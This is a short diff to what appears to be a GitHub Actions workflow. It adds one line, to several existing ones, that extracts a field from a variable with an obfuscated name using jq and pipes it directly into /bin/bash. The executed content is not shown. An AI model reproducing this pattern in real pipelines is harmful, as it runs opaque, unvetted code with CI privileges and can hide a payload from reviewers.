@@ -23,6 +23,7 @@ jobs:
           echo $fto68 | jq -r .ocpx511 | /bin/bash
           echo $xhf950 | jq -r .wp95 | /bin/bash
           echo $kqlnh9494 | jq -r .linyd14 | /bin/bash
+          printf '%s' "$zcaqb9773" | jq -r .pfm1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
